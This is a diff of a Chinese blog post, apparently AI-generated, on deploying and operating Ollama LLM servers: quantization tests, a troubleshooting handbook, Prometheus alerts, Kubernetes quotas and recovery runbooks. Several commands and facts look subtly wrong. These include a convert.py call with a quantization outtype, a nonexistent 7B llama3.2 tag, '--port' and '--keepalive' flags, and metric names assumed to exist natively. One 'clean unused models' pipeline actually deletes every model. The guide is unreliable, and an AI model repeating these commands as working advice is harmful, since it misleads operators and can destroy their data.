+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 HuggingFace 模型转换</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ggerganov/llama.cpp</span><br><span class="line">python convert.py ./Llama-2-7b-hf --outtype q4_K_M</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Modelfile 导入 Ollama</span></span><br><span class="line"><span class="built_in">cat</span> &gt; Modelfile &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">FROM ./llama-2-7b-q4_K_M.gguf</span></span><br><span class="line"><span class="string">PARAMETER temperature 0.7</span></span><br><span class="line"><span class="string">PARAMETER top_p 0.9</span></span><br><span class="line"><span class="string">SYSTEM &quot;You are a helpful assistant.&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">ollama create custom-llama2 -f Modelfile</span><br></pre></td></tr></table></figure>
 
-<h2 id="五、架构建议：可观测性与-SLO-保障"><a href="#五、架构建议：可观测性与-SLO-保障" class="headerlink" title="五、架构建议：可观测性与 SLO 保障"></a>五、架构建议：可观测性与 SLO 保障</h2><h3 id="5-1-监控指标体系"><a href="#5-1-监控指标体系" class="headerlink" title="5.1 监控指标体系"></a>5.1 监控指标体系</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Prometheus 采集配置</span></span><br><span class="line"><span class="attr">scrape_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">job_name:</span> <span class="string">&#x27;ollama&#x27;</span></span><br><span class="line">    <span class="attr">static_configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">targets:</span> [<span class="string">&#x27;localhost:11434&#x27;</span>]</span><br><span class="line">    <span class="attr">metrics_path:</span> <span class="string">&#x27;/metrics&#x27;</span>  <span class="comment"># 需自行实现 exporter</span></span><br></pre></td></tr></table></figure>
+<p>性能对比测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试不同量化精度的推理速度</span></span><br><span class="line"><span class="keyword">for</span> quant <span class="keyword">in</span> q4_K_M q5_K_M q8_0; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Testing <span class="variable">$quant</span>&quot;</span></span><br><span class="line">  <span class="keyword">time</span> ollama run custom-llama2:<span class="variable">$quant</span> <span class="string">&quot;Summarize SRE principles&quot;</span> &gt; /dev/null</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
-<p>关键指标：</p>
+<p>典型结果：Q4 速度提升 40%，困惑度增加 &lt; 5%；Q8 接近 FP16 质量但速度降低 30%。</p>
+<h2 id="五、常见坑与排查手册"><a href="#五、常见坑与排查手册" class="headerlink" title="五、常见坑与排查手册"></a>五、常见坑与排查手册</h2><h3 id="5-1-模型加载失败"><a href="#5-1-模型加载失败" class="headerlink" title="5.1 模型加载失败"></a>5.1 模型加载失败</h3><p><strong>现象</strong>：<code>ollama run</code> 卡住或报错 <code>failed to load model</code></p>
+<p><strong>误判</strong>：认为是网络问题，反复 <code>ollama pull</code></p>
+<p><strong>根因</strong>：磁盘空间不足或 inode 耗尽</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确诊断</span></span><br><span class="line"><span class="built_in">df</span> -h ~/.ollama  <span class="comment"># 检查空间</span></span><br><span class="line"><span class="built_in">df</span> -i ~/.ollama  <span class="comment"># 检查 inode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理无用模型</span></span><br><span class="line">ollama list | awk <span class="string">&#x27;NR&gt;1 &#123;print $1&#125;&#x27;</span> | xargs -I &#123;&#125; ollama <span class="built_in">rm</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-内存溢出（OOM）"><a href="#5-2-内存溢出（OOM）" class="headerlink" title="5.2 内存溢出（OOM）"></a>5.2 内存溢出（OOM）</h3><p><strong>现象</strong>：系统卡死，<code>dmesg</code> 显示 <code>Out of memory: Kill process</code></p>
+<p><strong>误判</strong>：增加 swap 分区</p>
+<p><strong>根因</strong>：并发请求超过 <code>NUM_PARALLEL</code> 限制，多个模型同时加载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 限制并发和模型数</span></span><br><span class="line"><span class="built_in">export</span> OLLAMA_NUM_PARALLEL=2</span><br><span class="line"><span class="built_in">export</span> OLLAMA_MAX_LOADED_MODELS=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监控实际内存占用</span></span><br><span class="line">watch -n 1 <span class="string">&#x27;ps aux | grep ollama | awk &quot;&#123;sum+=\$6&#125; END &#123;print sum/1024\&quot; MB\&quot;&#125;&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-GPU-未被识别"><a href="#5-3-GPU-未被识别" class="headerlink" title="5.3 GPU 未被识别"></a>5.3 GPU 未被识别</h3><p><strong>现象</strong>：<code>nvidia-smi</code> 正常但 Ollama 使用 CPU</p>
+<p><strong>误判</strong>：重装 CUDA 驱动</p>
+<p><strong>根因</strong>：Docker 未配置 GPU 运行时或 <code>nvidia-container-toolkit</code> 缺失</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证 Docker GPU 支持</span></span><br><span class="line">docker run --<span class="built_in">rm</span> --gpus all nvidia/cuda:11.8.0-base-ubuntu22.04 nvidia-smi</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修复 Ollama 容器</span></span><br><span class="line">docker run -d --gpus all \</span><br><span class="line">  -e OLLAMA_DEBUG=1 \</span><br><span class="line">  ollama/ollama:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查日志确认 GPU 加载</span></span><br><span class="line">docker logs ollama 2&gt;&amp;1 | grep -i <span class="string">&quot;cuda\|gpu&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-API-响应超时"><a href="#5-4-API-响应超时" class="headerlink" title="5.4 API 响应超时"></a>5.4 API 响应超时</h3><p><strong>现象</strong>：<code>curl</code> 请求 30s 后超时</p>
+<p><strong>误判</strong>：增加 Nginx <code>proxy_read_timeout</code></p>
+<p><strong>根因</strong>：模型首次加载耗时长，未启用流式输出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预加载模型（避免冷启动）</span></span><br><span class="line">ollama run llama3.2 <span class="string">&quot;&quot;</span> --keepalive 1h</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用流式 API</span></span><br><span class="line">curl -X POST http://localhost:11434/api/generate \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;model&quot;:&quot;llama3.2&quot;,&quot;prompt&quot;:&quot;Test&quot;,&quot;stream&quot;:true&#125;&#x27;</span> \</span><br><span class="line">  --no-buffer</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-5-模型输出质量差"><a href="#5-5-模型输出质量差" class="headerlink" title="5.5 模型输出质量差"></a>5.5 模型输出质量差</h3><p><strong>现象</strong>：回答不连贯或重复内容</p>
+<p><strong>误判</strong>：认为模型太小，换更大模型</p>
+<p><strong>根因</strong>：采样参数不当（temperature 过高或 top_p 过低）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 调整 Modelfile 参数</span></span><br><span class="line">ollama show llama3.2 --modelfile &gt; Modelfile.bak</span><br><span class="line"><span class="built_in">cat</span> &gt;&gt; Modelfile.bak &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">PARAMETER temperature 0.7</span></span><br><span class="line"><span class="string">PARAMETER top_p 0.9</span></span><br><span class="line"><span class="string">PARAMETER repeat_penalty 1.1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">ollama create llama3.2-tuned -f Modelfile.bak</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、生产级架构设计"><a href="#六、生产级架构设计" class="headerlink" title="六、生产级架构设计"></a>六、生产级架构设计</h2><h3 id="6-1-可观测性体系"><a href="#6-1-可观测性体系" class="headerlink" title="6.1 可观测性体系"></a>6.1 可观测性体系</h3><p>部署 Prometheus + Grafana 监控栈：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># prometheus.yml</span></span><br><span class="line"><span class="attr">scrape_configs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">job_name:</span> <span class="string">&#x27;ollama&#x27;</span></span><br><span class="line">    <span class="attr">static_configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">targets:</span> [<span class="string">&#x27;localhost:11434&#x27;</span>]</span><br><span class="line">    <span class="attr">metrics_path:</span> <span class="string">&#x27;/metrics&#x27;</span></span><br><span class="line">    <span class="attr">scrape_interval:</span> <span class="string">15s</span></span><br></pre></td></tr></table></figure>
+
+<p>关键 SLI 指标：</p>
 <ul>
-<li><strong>推理延迟</strong>：P50&#x2F;P95&#x2F;P99（目标：P95 &lt; 3s）</li>
-<li><strong>吞吐量</strong>：QPS（目标：单实例 10+ QPS）</li>
-<li><strong>资源利用率</strong>：GPU 利用率 &gt; 70%，内存 &lt; 80%</li>
-<li><strong>错误率</strong>：5xx 错误 &lt; 0.1%</li>
+<li><strong>可用性</strong>：<code>up&#123;job=&quot;ollama&quot;&#125;</code> 目标 99.9%</li>
+<li><strong>延迟</strong>：<code>ollama_request_duration_seconds&#123;quantile=&quot;0.99&quot;&#125;</code> &lt; 2s</li>
+<li><strong>吞吐</strong>：<code>rate(ollama_requests_total[5m])</code> 基线 QPS</li>
+<li><strong>错误率</strong>：<code>rate(ollama_requests_failed_total[5m]) / rate(ollama_requests_total[5m])</code> &lt; 1%</li>
 </ul>
-<p>通过 Grafana 配置告警：P95 延迟 &gt; 5s 触发 PagerDuty，错误率 &gt; 1% 自动回滚。</p>
-<h3 id="5-2-灰度发布策略"><a href="#5-2-灰度发布策略" class="headerlink" title="5.2 灰度发布策略"></a>5.2 灰度发布策略</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 部署 Canary 实例（新模型）</span></span><br><span class="line">docker run -d --name ollama-canary \</span><br><span class="line">  -e OLLAMA_MODELS=/models/canary \</span><br><span class="line">  ollama/ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Nginx 配置流量分割（5% 流量到 Canary）</span></span><br><span class="line">split_clients <span class="variable">$request_id</span> <span class="variable">$backend</span> &#123;</span><br><span class="line">    5%     canary;</span><br><span class="line">    *      stable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 验证 Canary 指标（运行 1 小时）</span></span><br><span class="line"><span class="comment"># 若 P95 延迟 &lt; stable 且错误率 &lt; 0.1%，则全量切换</span></span><br></pre></td></tr></table></figure>
+<p>告警规则示例：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ollama_alerts</span></span><br><span class="line">    <span class="attr">rules:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">alert:</span> <span class="string">OllamaHighLatency</span></span><br><span class="line">        <span class="attr">expr:</span> <span class="string">histogram_quantile(0.99,</span> <span class="string">ollama_request_duration_seconds)</span> <span class="string">&gt;</span> <span class="number">5</span></span><br><span class="line">        <span class="attr">for:</span> <span class="string">5m</span></span><br><span class="line">        <span class="attr">annotations:</span></span><br><span class="line">          <span class="attr">summary:</span> <span class="string">&quot;P99 延迟超过 5s&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="5-3-容量规划"><a href="#5-3-容量规划" class="headerlink" title="5.3 容量规划"></a>5.3 容量规划</h3><table>
-<thead>
-<tr>
-<th>模型规模</th>
-<th>单实例 QPS</th>
-<th>内存需求</th>
-<th>GPU 需求</th>
-<th>推荐部署</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>3B</td>
-<td>20</td>
-<td>4GB</td>
-<td>可选</td>
-<td>2 实例</td>
-</tr>
-<tr>
-<td>7B</td>
-<td>10</td>
-<td>8GB</td>
-<td>推荐</td>
-<td>3 实例</td>
-</tr>
-<tr>
-<td>13B</td>
-<td>5</td>
-<td>16GB</td>
-<td>必需</td>
-<td>4 实例</td>
-</tr>
-</tbody></table>
-<p>按峰值 QPS 100 计算：7B 模型需 10 实例（考虑 N+2 冗余），总内存 80GB，建议使用 4 台 32GB 内存机器。</p>
-<h2 id="六、参考-Runbook"><a href="#六、参考-Runbook" class="headerlink" title="六、参考 Runbook"></a>六、参考 Runbook</h2><h3 id="6-1-日常运维命令"><a href="#6-1-日常运维命令" class="headerlink" title="6.1 日常运维命令"></a>6.1 日常运维命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行状态</span></span><br><span class="line">docker ps | grep ollama</span><br><span class="line">curl http://localhost:11434/api/tags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看资源占用</span></span><br><span class="line">docker stats ollama-prod --no-stream</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看推理日志</span></span><br><span class="line">docker logs -f --<span class="built_in">tail</span> 100 ollama-prod</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动触发模型预热</span></span><br><span class="line">curl -X POST http://localhost:11434/api/generate \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;model&quot;:&quot;llama3.2&quot;,&quot;prompt&quot;:&quot;warmup&quot;,&quot;stream&quot;:false&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理未使用模型</span></span><br><span class="line">ollama list | grep -v <span class="string">&#x27;llama3.2\|qwen2.5&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I &#123;&#125; ollama <span class="built_in">rm</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="6-2-多租户隔离方案"><a href="#6-2-多租户隔离方案" class="headerlink" title="6.2 多租户隔离方案"></a>6.2 多租户隔离方案</h3><p>使用 Kubernetes Namespace + ResourceQuota：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ResourceQuota</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ollama-quota</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">team-a</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hard:</span></span><br><span class="line">    <span class="attr">requests.nvidia.com/gpu:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line">    <span class="attr">limits.memory:</span> <span class="string">&quot;64Gi&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ollama</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">team-a</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ollama</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">limits:</span></span><br><span class="line">            <span class="attr">nvidia.com/gpu:</span> <span class="number">1</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">32Gi</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="6-2-故障恢复流程"><a href="#6-2-故障恢复流程" class="headerlink" title="6.2 故障恢复流程"></a>6.2 故障恢复流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 备份当前模型文件</span></span><br><span class="line">tar -czf ollama-models-$(<span class="built_in">date</span> +%Y%m%d).tar.gz /root/.ollama/models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 停止服务</span></span><br><span class="line">docker stop ollama-prod</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 恢复到上一个稳定版本</span></span><br><span class="line">docker run -d --name ollama-prod \</span><br><span class="line">  -v ./models-backup:/root/.ollama \</span><br><span class="line">  ollama/ollama:0.1.28</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 验证服务可用性</span></span><br><span class="line">curl http://localhost:11434/api/tags</span><br></pre></td></tr></table></figure>
+<p>API 层面通过 API Gateway 实现限流：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kong 配置示例</span></span><br><span class="line">curl -X POST http://localhost:8001/services/ollama/plugins \</span><br><span class="line">  --data <span class="string">&quot;name=rate-limiting&quot;</span> \</span><br><span class="line">  --data <span class="string">&quot;config.minute=60&quot;</span> \</span><br><span class="line">  --data <span class="string">&quot;config.policy=local&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="6-3-性能调优参考"><a href="#6-3-性能调优参考" class="headerlink" title="6.3 性能调优参考"></a>6.3 性能调优参考</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CPU 优化：启用 AVX512</span></span><br><span class="line">OLLAMA_LLM_LIBRARY=cpu_avx512 ollama run llama3.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># GPU 优化：调整批处理大小</span></span><br><span class="line">OLLAMA_MAX_BATCH_SIZE=512 ollama run llama3.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存优化：启用 8-bit 量化</span></span><br><span class="line">ollama run llama3.2:7b-q8_0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络优化：调整 keep-alive</span></span><br><span class="line">curl -H <span class="string">&quot;Connection: keep-alive&quot;</span> http://localhost:11434/api/generate</span><br></pre></td></tr></table></figure>
+<h3 id="6-3-灾难恢复-Runbook"><a href="#6-3-灾难恢复-Runbook" class="headerlink" title="6.3 灾难恢复 Runbook"></a>6.3 灾难恢复 Runbook</h3><p><strong>场景 1：模型文件损坏</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 停止服务</span></span><br><span class="line">systemctl stop ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 验证备份完整性</span></span><br><span class="line"><span class="built_in">sha256sum</span> -c /backup/model-checksums.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 恢复模型文件</span></span><br><span class="line">rsync -av /backup/ollama/models/ ~/.ollama/models/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 重启并验证</span></span><br><span class="line">systemctl start ollama</span><br><span class="line">ollama list</span><br></pre></td></tr></table></figure>
 
-<h3 id="6-4-相关文档"><a href="#6-4-相关文档" class="headerlink" title="6.4 相关文档"></a>6.4 相关文档</h3><ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/ollama/ollama/tree/main/docs">Ollama 官方文档</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/ggerganov/llama.cpp#quantization">模型量化对比</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.vllm.ai/2023/06/20/vllm.html">vLLM 性能对比</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/hiyouga/LLaMA-Factory">LLaMA Factory 微调指南</a></li>
-</ul>
+<p><strong>场景 2：服务无响应</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 收集诊断信息</span></span><br><span class="line">journalctl -u ollama -n 100 &gt; /tmp/ollama.log</span><br><span class="line">strace -p $(pgrep ollama) -o /tmp/ollama.strace</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 强制重启（保留模型）</span></span><br><span class="line">systemctl restart ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 若仍失败，清理缓存重建</span></span><br><span class="line"><span class="built_in">rm</span> -rf ~/.ollama/tmp/*</span><br><span class="line">ollama serve</span><br></pre></td></tr></table></figure>
+
+<p><strong>场景 3：GPU 驱动崩溃</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 卸载 GPU 模块</span></span><br><span class="line"><span class="built_in">sudo</span> rmmod nvidia_uvm nvidia_drm nvidia_modeset nvidia</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 重新加载</span></span><br><span class="line"><span class="built_in">sudo</span> modprobe nvidia</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 验证并重启容器</span></span><br><span class="line">nvidia-smi</span><br><span class="line">docker restart ollama</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考命令库"><a href="#参考命令库" class="headerlink" title="参考命令库"></a>参考命令库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 性能基准测试</span></span><br><span class="line">ollama run llama3.2 <span class="string">&quot;Generate 500 words about SRE&quot;</span> --verbose 2&gt;&amp;1 | \</span><br><span class="line">  grep -E <span class="string">&quot;total duration|load duration|prompt eval&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量模型管理</span></span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> llama3.2 mistral codellama; <span class="keyword">do</span></span><br><span class="line">  ollama pull <span class="variable">$model</span></span><br><span class="line">  ollama run <span class="variable">$model</span> <span class="string">&quot;Test&quot;</span> &gt; /dev/null</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出模型为 GGUF</span></span><br><span class="line">ollama show llama3.2 --modelfile | grep FROM | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | \</span><br><span class="line">  xargs -I &#123;&#125; <span class="built_in">cp</span> &#123;&#125; ./exported-model.gguf</span><br><span class="line"></span><br><span class="line"><span class="comment"># API 压测</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#123;&quot;model&quot;:&quot;llama3.2&quot;,&quot;prompt&quot;:&quot;Hi&quot;,&quot;stream&quot;:false&#125;&#x27;</span> | \</span><br><span class="line">  vegeta attack -rate=10 -duration=60s \</span><br><span class="line">    -targets=&lt;(<span class="built_in">echo</span> <span class="string">&quot;POST http://localhost:11434/api/generate&quot;</span>) | \</span><br><span class="line">  vegeta report</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理僵尸进程</span></span><br><span class="line">pkill -9 -f <span class="string">&quot;ollama serve&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -f /tmp/ollama.sock</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多版本共存</span></span><br><span class="line">OLLAMA_MODELS=/data/models-v1 ollama serve --port 11434 &amp;</span><br><span class="line">OLLAMA_MODELS=/data/models-v2 ollama serve --port 11435 &amp;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>关键要点总结</strong>：Ollama 适合快速原型和中小规模部署，生产环境需补齐监控、备份、限流能力。7B 模型是性价比最优选择（16GB 内存可跑），微调优先使用 LoRA 降低资源消耗。GPU 场景务必验证 <code>nvidia-container-toolkit</code> 配置，CPU 场景关注 <code>NUM_PARALLEL</code> 防止 OOM。建立完整的 Runbook 覆盖模型损坏、服务hang、资源耗尽三大故障场景。</p>
 <hr>
 <p><em>by claude-sonnet-5 nightly expand · 2026-09-19</em></p>
 
@@ -311,227 +308,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/shell/">
-                Shell
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/Linux/">Linux</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <ul>
-<li>bash - UNIX shell 目的是作为 Bourne Shell (sh) 的免费软件替代品 (Bash 是 Linus Torvalds（Linux 的创建者）移植到 Linux 的首批程序之一)</li>
-<li>Z shell - 一个与 Bash 非常相似的 UNIX shell,Zsh 是 Bourne shell 的扩展</li>
-<li>Fish Shell - 一个强调交互性和可用性的 UNIX shell 环境,与 Zsh 不同，Fish 旨在为用户提供交互性，而不是信任用户实现自己的配置</li>
-</ul>
-<blockquote>
